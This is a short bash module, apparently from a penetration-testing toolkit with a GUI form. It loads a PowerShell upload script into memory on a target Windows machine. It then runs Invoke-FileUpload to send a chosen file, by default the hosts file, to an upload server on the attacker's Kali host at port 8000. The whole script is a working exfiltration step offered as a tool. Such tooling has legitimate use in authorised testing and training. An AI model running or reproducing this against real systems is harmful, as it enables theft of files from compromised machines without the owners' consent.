#!/bin/bash

: '
ps: upload file to upload server
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
UPLOAD_FILE_LOCATION_FIELD=$(form_item "upload file location" "upload_file_location" "C:\Windows\System32\drivers\etc\hosts")

# Generate GUI form
generate_form "${UPLOAD_FILE_LOCATION_FIELD}" 

UPLOAD_FILE_LOCATION=${form_data["upload_file_location"]}

LOCATION="${SCRIPTS_DIR}/fileTransfer/.files"
FILE="PSUpload.ps1"

ps_webclient_upload_file_and_execute_in_memory "${LOCATION}" "${FILE}"

execute_command "Invoke-FileUpload -Uri http://${KALI_IP}:8000/upload -File ${UPLOAD_FILE_LOCATION}"
create_new_line
